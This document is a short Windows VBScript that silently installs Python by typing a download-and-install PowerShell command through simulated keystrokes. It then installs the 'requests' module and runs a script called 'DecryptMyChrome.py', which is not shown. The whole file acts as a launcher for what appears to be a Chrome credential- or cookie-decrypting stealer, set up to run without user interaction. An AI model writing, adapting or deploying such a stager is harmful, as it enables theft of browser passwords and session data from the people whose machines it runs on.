Set WshShell = WScript.CreateObject("WScript.Shell")

' Function to check if Python is installed
Function IsPythonInstalled()
    Dim objExec, strOutput
    On Error Resume Next
    Set objExec = WshShell.Exec("cmd /c python --version")
    strOutput = objExec.StdOut.ReadAll
    On Error GoTo 0

    If InStr(strOutput, "Python") > 0 Then
        IsPythonInstalled = True
    Else
        IsPythonInstalled = False
    End If
End Function

If Not IsPythonInstalled() Then
    ' Open Command Prompt
    WshShell.Run "cmd.exe"
    WScript.Sleep 2000   ' wait for cmd to load

    ' Switch to PowerShell
    WshShell.SendKeys "powershell"
    WScript.Sleep 500
    WshShell.SendKeys "{ENTER}"
    WScript.Sleep 1000   ' wait for PowerShell to start

    ' PowerShell command to download and install Python
    installPython = "$url = 'https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe'; " & _
                    "$output = ""$env:TEMP\python_installer.exe""; " & _
                    "Invoke-WebRequest -Uri $url -OutFile $output; " & _
                    "Start-Process -FilePath $output -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait"

    ' Send the command into PowerShell
    WshShell.SendKeys installPython
    WScript.Sleep 500
    WshShell.SendKeys "{ENTER}"

    ' Wait for Python installation to complete
    WScript.Sleep 30000   ' 30 seconds, adjust if needed
End If

' Install the requests module
WshShell.Run "cmd /c python -m pip install --upgrade pip", 1, True
WshShell.Run "cmd /c python -m pip install requests", 1, True

' Run the Python script
WshShell.Run "cmd /c python DecryptMyChrome.py", 1, True
